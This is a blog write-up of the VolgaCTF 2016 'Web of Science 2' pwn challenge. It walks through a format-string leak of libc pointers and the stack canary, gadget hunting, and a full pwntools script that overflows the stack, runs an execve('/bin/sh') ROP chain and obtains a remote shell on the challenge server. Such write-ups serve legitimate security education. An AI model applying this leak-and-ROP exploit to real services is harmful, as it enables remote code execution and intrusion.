---
layout: post
title: "VolgaCTF - Web of Science 2"
date: 2016-03-29 00:00
categories: ctf exploit
---
This is the second pwn of VolgaCTf; it is based on Web of Science. Stay tuned
for the write-up for the third and final one.

Now that NX is activated, Let's do some real exploitation with a good old ROP chain!

# Basic information

From the organizers:
{% highlight text %}
Web of Science 2

This is an improved version of the early version of the well-known scientific
search engine. Curiously, it's still working.

nc webofscience2.2016.volgactf.ru 45679
{% endhighlight %}

The binary has the same attributes as the previous one except that NX is now activated.

{% highlight shell-session %}
$ file web_of_science
web_of_science: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux
2.6.24, BuildID[sha1]=85e0df26435ee411258ad39668c9700b1ebadec9, stripped

$ checksec --file web_of_science
RELRO
Partial RELRO

STACK CANARY
Canary found

NX
NX enabled

PIE
No PIE

RPATH
No RPATH

RUNPATH
No RUNPATH
{% endhighlight %}

The binary is a little different than the previous one because some unused
functions were added to it. They can be fragments of the next binary.

## Operation

The operation is the same as the previous one, therefore I won't go into more
details.

## Vulnerabilities

The vulnerabilities are the same as the previous one:

1. string format on the name;
2. stack buffer overflow on the responses to the ten additions.

The stack is layed out exactly the same as for the previous binary, therefore I
won't reexplain both vulnerabilities.

## Exploitation

The goal of the ROP chain is to create a remote shell so that we can find the
flag. The `execve` system call will be used to invoke `/bin/sh`.

Unfortunatly the binary doesn't contain some key gadgets to construct the ROP
chain easily, therefore we need to take them from the libc.

When we look at the strings contained inside the binary, we can see that it was
built with GCC on an Ubuntu machine:
{% highlight shell-session %}
$ strings web_of_science2
[snip]
GCC: (Ubuntu 4.8.4-2ubuntu1~14.04.1) 4.8.4
GCC: (Ubuntu 4.8.2-19ubuntu1) 4.8.2
[snip]
{% endhighlight %}

We know that the version of Ubuntu is 14.04 and that the gcc package was
created on [January 27][gcc]. The latest libc version used by Ubuntu 14.04 is
[2.19][libc] and it was built on [February 16][libc2]. That could be the libc
that is running on the machine that runs the challenge, to be sure, we'll have
to leak some part of it and compare.

Some libc are known to contain a magic gadget that execute `/bin/sh` by itself
which makes the exploitation rather easy because no ROP chain has to be built.
However, even if the magic gadget was executing without any problem, I don't
understand why no shell was poped. Therefore a proper ROP chain must be
created.

![y u no work](http://cdn.meme.am/cache/instances/folder212/500x/67595212.jpg)

## Libc comparison

The string format vulnerability can be used to find pointers to the libc and
leak the memory they point to. To do that a few `%p` and a debugger is needed:

{% highlight shell-session %}
$ gdb -q ./web_of_science2
gef loaded, `gef help' to start, `gef config' to configure
29 commands loaded (10 sub-commands), using Python engine 3.4
Reading symbols from ./web_of_science2...(no debugging symbols found)...done.
gef➤  r
Starting program: ./web_of_science2 
Tell me your name first
%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p 
%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
Alright, pass a little test first, would you.
28769 + 44853 = ?
0x7fffffffbd60 0x7ffff79fb9e0 0xffffffffffffffff 0x7ffff7fef740 0x7ffff79f9140
0x1060307d 0xa00000000 0xaf3500007061 0x11f96 0x7025207025207025 0x25207025207
02520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252
070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x702520702520702
5 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 
0x2070252070252070 0x7025207025207025 0x722072756f79202c 0x3a65736e6f707365 0x
7fffffff0020 0x7ffff7de9557 0x1 (nil) 0x7fffffffe560 0x7ffff763fbf8 (nil) 0x7f
ffffffe5c0 0x400930 0x7ffff7df0515 0x56fa4787 0x7ffff7677eee (nil) 0x12b26f64f
79fb9e0 (nil) 0x3f204c1c5f0bbc00, your response: ^Z
Program received signal SIGTSTP, Stopped (user).
[snip]
gef➤  vmmap
             Start                End             Offset Perm Path
[snip]
0x00007ffff763b000 0x00007ffff77f6000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.19.so
0x00007ffff77f6000 0x00007ffff79f5000 0x00000000001bb000 --- /lib/x86_64-linux-gnu/libc-2.19.so
0x00007ffff79f5000 0x00007ffff79f9000 0x00000000001ba000 r-- /lib/x86_64-linux-gnu/libc-2.19.so
0x00007ffff79f9000 0x00007ffff79fb000 0x00000000001be000 rw- /lib/x86_64-linux-gnu/libc-2.19.so
[snip]
{% endhighlight %}

the 5th and 39th pointers point to somewhere in the libc:
{% highlight shell-session %}
gef➤  x/gx 0x7ffff79f9140
0x7ffff79f9140 <pa_next_type>:	0x0000000000000008
gef➤  x/gx 0x7ffff7677eee
0x7ffff7677eee <__srandom_r+206>:	0x48c031ed75fffb83
{% endhighlight %}

Let's see what they contain on the remote binary by using the `%s` format this
time:
{% highlight shell-session %}
$ nc webofscience2.2016.volgactf.ru 45679
Tell me your name first
%5$s %39$s 
Alright, pass a little test first, would you.
17944 + 62901 = ?                                                                                                      ûÿuí1ÀHÄ[]A\øÿÿÿÿëðff. , your response:
{% endhighlight %}

A tool to capture traffic is needed to see what is in the returned packet:
{% highlight shell-session %}
    00000018  41 6c 72 69 67 68 74 2c  20 70 61 73 73 20 61 20   Alright,  pass a 
    00000028  6c 69 74 74 6c 65 20 74  65 73 74 20 66 69 72 73   little t est firs
    00000038  74 2c 20 77 6f 75 6c 64  20 79 6f 75 2e 0a 31 37   t, would  you..17
    00000048  39 34 34 20 2b 20 36 32  39 30 31 20 3d 20 3f 0a   944 + 62 901 = ?.
    00000058  08 20 83 fb ff 75 ed 31  c0 48 83 c4 10 5b 5d 41   . ...u.1 .H...[]A
    00000068  5c c3 b8 ff ff ff ff eb  f0 66 66 2e 0f 1f 84 20   \....... .ff.... 
    00000078  2c 20 79 6f 75 72 20 72  65 73 70 6f 6e 73 65 3a   , your r esponse:
{% endhighlight %}

The leak starts right after the newline at `17944 + 62901 = ?`. The byte number
`0x58` is `0x08` which correspond to what is located at `0x7ffff79f9140`. Then
there is `0x20` which is a whitespace. Then there is `0x83` which correspond
the the first byte located at `0x7ffff7677eee` and the following bytes
correspond. It seems that we have the same libc `\o/`

## ROP chain creation

The goal is to trigger the `execve` syscall with `/bin/sh` as argument. Here is
what must be set into the registers:

* `rax`: syscall number: 59
* `rdi`: filename: pointer to `/bin/sh`
* `rsi`: argv: NULL because we don't need it
* `rdx`: envp: NULL because we don't need it

All that information can be seen in the manpage of `execve` and `syscall`.

[`ROPgadget`][ropgadget] can be used to find ROP gadget:
{% highlight shell-session %}
0x000000000001b218 : pop rax ; ret
0x0000000000022b1a : pop rdi ; ret
0x0000000000024805 : pop rsi ; ret
0x0000000000001b8e : pop rdx ; ret
0x00000000000c1e55 : syscall ; ret
{% endhighlight %}

The addresses are offsets from the beginning of the libc. To that the base
address must be added. Earlier we leaked a pointer to the libc and found the base
address. The offset of the leaked address can be calculated as follow:
{% highlight shell-session %}
offset = leaked_addr - base_addr
       = 0x7ffff79f9140 - 0x7ffff763b000
       = 3924288
{% endhighlight %}

We still need to find a pointer to `/bin/sh`. There are two possibilities,
either we provide the string `/bin/sh` in the ROP chain and we find a gadget
that does `mov rdi, rsp; ...` or we find the address of an existing `/bin/sh`.
As I usually opt for the first option and I already explained in other
write-ups, let's do the second one... or maybe this is because we've already
leaked an address to the libc.

As stated earlier, the libc contains the magic gadget, therefore it has to have
the string `/bin/sh` somewhere:
{% highlight ca65 %}
$ r2 -A libc-2.19.so
 -- Bindings are mostly powered by tears.
[0x00021fd0]> / /bin/sh
Searching 7 bytes from 0x00000270 to 0x003c42c0: 2f 62 69 6e 2f 73 68 
Searching 7 bytes in [0x270-0x3c42c0]
hits: 1
0x0017ccdb hit0_0 "/bin/sh"
{% endhighlight %}

`0x0017ccdb` is the offset of the string `/bin/sh`. As for the gadgets, the
base address of the libc must be added.

We ended up with the following layout to put on the stack:
{% highlight shell-session %}
libc_base + 0x1b218  | pop rax ; ret
59                   | syscall number
libc_base + 0x22b1a  | pop rdi ; ret
libc_base + 0x17ccdb | addr of `/bin/sh`
libc_base + 0x24805  | pop rsi ; ret
0                    | NULL
libc_base + 0x01b8e  | pop rdx ; ret
0                    | NULL
libc_base + 0xc1e55  | syscall ; ret
{% endhighlight %}

## Final payload

Now we have everything we need to create the payload:

* 136 bytes of padding (there was the shellcode in the previous challenge)
* canary
* 24 bytes of padding
* ropchain

{% highlight python %}
#!/usr/bin/env python2

from pwn import *

HOST = 'webofscience2.2016.volgactf.ru'
PORT = 45679

libc_offset= 3924288

leak = '|%5$p|%43$p|'

r = remote(HOST, PORT)

log.info('Sending leak')
r.sendline(leak)
data = r.recvuntil('your response:')
data = data.split('|')
libc_ptr = int(data[1], 16)
canary = int(data[2], 16)
base_addr = libc_ptr - libc_offset
log.info('leaked canary: 0x{:x}'.format(canary))
log.info('leaked libc ptr: 0x{:x}'.format(libc_ptr))
for i in range(0,9):
    log.info('Sending calc #{}'.format(i))
    r.sendline(str(i))
    r.recv()
log.info('Sending payload')
payload = 136 * 'A' + p64(canary) + 3 * p64(0x0)
# 0x000000000001b218 : pop rax ; ret
payload += p64(base_addr + 0x1b218)
payload += p64(59)
# 0x0000000000022b1a : pop rdi ; ret
payload += p64(base_addr + 0x22b1a)
payload += p64(base_addr + 1559771)
# 0x0000000000024805 : pop rsi ; ret
payload += p64(base_addr + 0x24805)
payload += p64(0)
# 0x0000000000001b8e : pop rdx ; ret
payload += p64(base_addr + 0x1b8e)
payload += p64(0)
# 0x00000000000c1e55 : syscall ; ret
payload += p64(base_addr + 0xc1e55)
r.sendline(payload)
r.recv()
r.clean()
r.interactive()
{% endhighlight %}

And finally:
{% highlight shell-session %}
$ ./payload.py 
[+] Opening connection to webofscience2.2016.volgactf.ru on port 45679: Done
[*] Sending leak
[*] leaked canary: 0x3da4ad9a1d93ac00
[*] leaked libc ptr: 0x7ffff79f7140
[*] Sending calc #0
[*] Sending calc #1
[*] Sending calc #2
[*] Sending calc #3
[*] Sending calc #4
[*] Sending calc #5
[*] Sending calc #6
[*] Sending calc #7
[*] Sending calc #8
[*] Sending payload
[*] Switching to interactive mode
$ ls
flag_wos2.txt
install
start_wos2
web_of_science2
$ cat flag_wos2.txt
VolgaCTF{DEP_with0ut_ASLR_is_us3less}
{% endhighlight %}

Well... ASLR or not, that payload would still rekt you ;)
![kappa](https://lh3.googleusercontent.com/85mHJYIs__p80RQxXMMkUafjy2nngqVZbTVUmHsoWif5pOfeh-3_LetG2eoupw69QZ2PojmOMaWelZ4k_7HkJC7P9LeEUAAIdWBkVPf5sE0ebBGA1dhgLxpuBoaUuNPo9e5wjHc){:height="36px" width="36px"}

[gcc]: http://archive.ubuntu.com/ubuntu/pool/main/g/gcc-4.8
[libc]: http://packages.ubuntu.com/trusty/libc6
[libc2]: http://archive.ubuntu.com/ubuntu/pool/main/e/eglibc/
[ropgadget]: https://github.com/JonathanSalwan/ROPgadget
